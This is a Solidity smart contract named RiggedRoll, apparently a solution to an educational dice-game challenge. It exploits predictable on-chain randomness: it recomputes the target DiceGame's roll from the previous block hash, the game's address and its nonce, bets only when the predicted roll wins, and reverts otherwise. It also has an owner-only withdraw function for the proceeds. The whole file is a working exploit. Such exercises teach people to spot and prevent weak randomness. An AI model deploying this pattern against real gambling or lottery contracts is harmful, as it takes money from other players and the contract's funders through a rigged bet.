pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    receive() external payable {}

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "Not enough funds in contract");
        
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Please fund contract with at least 0.002 ETH");

        bytes32 prevHash = blockhash(block.number - 1);
        
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("Predicted Roll:", roll);

        if (roll <= 5) {
            console.log("Winning roll found! Attacking...");
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            console.log("Losing roll. Reverting...");
            revert("Roll is not a winner");
        }
    }
}